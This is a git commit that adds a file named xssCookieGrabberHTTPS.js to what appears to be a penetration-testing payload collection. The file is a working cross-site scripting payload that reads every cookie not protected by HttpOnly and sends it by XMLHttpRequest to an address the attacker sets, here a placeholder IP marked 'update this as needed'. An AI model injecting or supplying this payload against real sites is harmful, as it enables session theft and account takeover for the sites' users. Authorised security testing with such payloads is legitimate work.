634cef552e958c00da8c28c75e0e128ff3ba4a7b
Jakob Pennington <jakob@pennington.io>
2020-05-06 20:28:29 +0930

    Added basic XSS payloads

---
+++ payloads/xss/xssCookieGrabberHTTPS.js
@@ -0,0 +1,19 @@
+/**
+ *  cookieGrabber
+ *
+ *  A function that sends all cookies not protected by HttpOnly via an XMLHttpRequest
+ *  to the provided URL.
+ */
+
+/**
+ * update this as needed
+ */
+const ipAddress = '127.0.0.1';
+
+// construct the target url
+var url = `https://${ipAddress}/cookies=`;
+
+// construct and send the request
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open('GET', url + document.cookie, true);
+xmlHttp.send();
